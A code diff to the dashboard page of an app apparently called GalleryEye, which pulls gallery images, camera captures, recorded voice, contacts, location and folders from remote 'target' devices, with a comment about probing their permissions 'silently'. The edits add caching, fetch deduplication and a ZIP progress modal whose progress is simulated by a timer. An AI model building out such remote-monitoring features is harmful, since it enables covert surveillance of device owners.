@@ -110,7 +110,22 @@ export default function Home(props: any) {
             }
         }
     }, [session]);
-    const [images, setImages] = useState<any[]>([]);
+    const [images, setImages] = useState<any[]>(() => {
+        if (typeof window !== 'undefined') {
+            try {
+                const devId = localStorage.getItem('selectedDeviceId');
+                const u = localStorage.getItem('galleryeye_user_uuid') || localStorage.getItem('galleryeye_last_uuid');
+                if (devId && u) {
+                    const cached = localStorage.getItem(`gallery_images_${u}_${devId}`);
+                    if (cached) {
+                        const parsed = JSON.parse(cached);
+                        if (Array.isArray(parsed) && parsed.length > 0) return parsed;
+                    }
+                }
+            } catch {}
+        }
+        return [];
+    });
     const [galleryPage, setGalleryPage] = useState(1);
     const [galleryHasMore, setGalleryHasMore] = useState(true);
     const [isLoadingMore, setIsLoadingMore] = useState(false);
@@ -143,6 +158,7 @@ export default function Home(props: any) {
     const [devices, setDevices] = useState<any[]>([]);
     const [selectedDeviceId, setSelectedDeviceId] = useState<string | null>(null);
     const selectedDeviceIdRef = useRef<string | null>(null);
+    const prevDeviceFetchedRef = useRef<string | null>(null);
     const [isDeviceDropdownOpen, setIsDeviceDropdownOpen] = useState(false);
     const [navDropdown, setNavDropdown] = useState<'tools' | 'devices' | 'profile' | null>(null);
     const [socketPing, setSocketPing] = useState<number>(14);
@@ -283,7 +299,7 @@ export default function Home(props: any) {
             return;
         }
         if (typeof window !== 'undefined') {
-            const uuid = (session?.user as any)?.uuid;
+            const uuid = (session?.user as any)?.uuid || (typeof window !== 'undefined' ? (localStorage.getItem('galleryeye_user_uuid') || localStorage.getItem('galleryeye_last_uuid')) : null);
             try {
                 let cContacts: any[] = [];
                 try {
@@ -327,12 +343,8 @@ export default function Home(props: any) {
                 } catch {}
                 setCapturedVoice(Array.isArray(cVoice) ? cVoice : []);
 
-                let cFolders: any[] = [];
-                try {
-                    const cachedFolders = localStorage.getItem(`gallery_folders_${uuid}_${selectedDeviceId}`);
-                    if (cachedFolders) cFolders = JSON.parse(cachedFolders) || [];
-                } catch {}
-                setFolders(Array.isArray(cFolders) ? cFolders : []);
+                // Folders remain hidden on page refresh/device switch until user explicitly clicks "Scan Folders"
+                setFolders([]);
 
                 const cachedLoc = localStorage.getItem(`loc_${selectedDeviceId}`);
                 if (cachedLoc) {
@@ -365,14 +377,17 @@ export default function Home(props: any) {
                 console.error('[Cache] Error restoring device cache:', err);
             }
 
-            if ((window as any).fetchGalleryData) {
-                (window as any).fetchGalleryData(1, false, false, selectedDeviceId);
-            }
-            if ((window as any).fetchCameraData) {
-                (window as any).fetchCameraData(1, selectedDeviceId);
-            }
-            if ((window as any).fetchVoiceData) {
-                (window as any).fetchVoiceData(1, selectedDeviceId);
+            if (prevDeviceFetchedRef.current !== selectedDeviceId) {
+                prevDeviceFetchedRef.current = selectedDeviceId;
+                if ((window as any).fetchGalleryData) {
+                    (window as any).fetchGalleryData(1, false, false, selectedDeviceId);
+                }
+                if ((window as any).fetchCameraData) {
+                    (window as any).fetchCameraData(1, selectedDeviceId);
+                }
+                if ((window as any).fetchVoiceData) {
+                    (window as any).fetchVoiceData(1, selectedDeviceId);
+                }
             }
 
             if (uuid) {
@@ -2071,6 +2086,16 @@ export default function Home(props: any) {
                                         merged.push(pItem);
                                     }
                                 });
+
+                                // Referential stability: if merged array contains the exact same items as prev, keep prev reference to prevent re-render & image reload flicker
+                                if (prev.length === merged.length && prev.length > 0) {
+                                    const isIdentical = prev.every((p, idx) => {
+                                        const m = merged[idx];
+                                        return m && ((p.id && p.id === m.id) || (p.url && p.url === m.url));
+                                    });
+                                    if (isIdentical) return prev;
+                                }
+
                                 return merged;
                             });
                         }
@@ -2224,10 +2249,22 @@ export default function Home(props: any) {
     const fetchFolders = () => {
         requireConnectedDevice((targetId) => {
             const effectiveTarget = targetId || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
-            if (socket && effectiveTarget && userUuid) {
+            const effectiveUuid = userUuid || (typeof window !== 'undefined' ? (localStorage.getItem('galleryeye_user_uuid') || localStorage.getItem('galleryeye_last_uuid')) : null);
+            if (socket && effectiveTarget && effectiveUuid) {
+                // Instantly show previously cached folders on explicit user scan click for 0ms response
+                try {
+                    const cached = localStorage.getItem(`gallery_folders_${effectiveUuid}_${effectiveTarget}`);
+                    if (cached) {
+                        const parsed = JSON.parse(cached);
+                        if (Array.isArray(parsed) && parsed.length > 0) {
+                            setFolders(parsed);
+                        }
+                    }
+                } catch {}
+
                 setIsFetchingFolders(true);
                 socket.emit("get_folders", {
-                    uuid: userUuid,
+                    uuid: effectiveUuid,
                     targetDeviceId: effectiveTarget
                 });
                 // Fallback safety timeout so it never hangs spinning forever
@@ -2684,21 +2721,13 @@ export default function Home(props: any) {
         setAudioError(null);
         setLocationError(null);
 
-        // 3. Keep selectedDeviceIdRef updated
+        // 3. Keep selectedDeviceIdRef updated & clear folders until explicitly scanned
         selectedDeviceIdRef.current = selectedDeviceId;
+        setFolders([]);
 
-        // 4. If currently viewing gallery, re-scan folders for new device if online
+        // 4. Probe live permissions silently for the newly selected device
         const targetDevObj = devices.find(d => String(d.deviceId || d.id || d._id) === String(selectedDeviceId));
         if (targetDevObj?.online && socket && userUuid) {
-            if (selectedTool === 'gallery') {
-                setIsFetchingFolders(true);
-                socket.emit("get_folders", {
-                    uuid: userUuid,
-                    targetDeviceId: selectedDeviceId
-                });
-                setTimeout(() => setIsFetchingFolders(false), 10000);
-            }
-            // Probe live permissions silently for the newly selected device
             socket.emit("check_permissions", {
                 uuid: userUuid,
                 targetDeviceId: selectedDeviceId
@@ -2822,6 +2851,22 @@ export default function Home(props: any) {
         }
 
         setIsDownloading(true);
+        const totalFiles = selectedUrls.length;
+        setSyncOptionsFolder({ name: 'Selected Media', count: totalFiles, type: 'image' });
+        setZipProgress({ stage: 'creating', current: 1, total: totalFiles, url: '', error: '' });
+        setShowZipProgressModal(true);
+
+        let currentTick = 1;
+        const progressInterval = setInterval(() => {
+            currentTick = Math.min(totalFiles - 1, currentTick + Math.max(1, Math.floor(totalFiles / 8)));
+            setZipProgress(prev => ({
+                ...prev,
+                stage: currentTick > totalFiles / 2 ? 'uploading' : 'creating',
+                current: currentTick,
+                total: totalFiles
+            }));
+        }, 250);
+
         try {
             const response = await fetch('https://p01--gallery-eye--9zr85m7yb6s4.code.run/download-zip', {
                 method: 'POST',
@@ -2829,21 +2874,47 @@ export default function Home(props: any) {
                 body: JSON.stringify({ urls: selectedUrls })
             });
 
+            clearInterval(progressInterval);
+
             if (response.ok) {
                 const blob = await response.blob();
                 const url = window.URL.createObjectURL(blob);
+                setZipProgress({
+                    stage: 'ready',
+                    current: totalFiles,
+                    total: totalFiles,
+                    url: url,
+                    error: ''
+                });
+
                 const a = document.createElement('a');
                 a.href = url;
-                a.download = `gallery_download_${new Date().toISOString()}.zip`;
+                a.download = `gallery_download_${new Date().toISOString().slice(0, 19).replace(/:/g, '-')}.zip`;
                 document.body.appendChild(a);
                 a.click();
-                window.URL.revokeObjectURL(url);
                 document.body.removeChild(a);
                 setSelectedItems(new Set());
                 setIsSelectionMode(false);
+
+                // Keep modal visible briefly to show complete checkmark, then dismiss
+                setTimeout(() => {
+                    setShowZipProgressModal(false);
+                }, 2200);
+            } else {
+                setZipProgress(prev => ({
+                    ...prev,
+                    stage: 'error',
+                    error: 'Failed to package files into ZIP. Please try again.'
+                }));
             }
         } catch (error) {
+            clearInterval(progressInterval);
             console.error("Download failed", error);
+            setZipProgress(prev => ({
+                ...prev,
+                stage: 'error',
+                error: 'Network connection interrupted during packaging.'
+            }));
         } finally {
             setIsDownloading(false);
         }
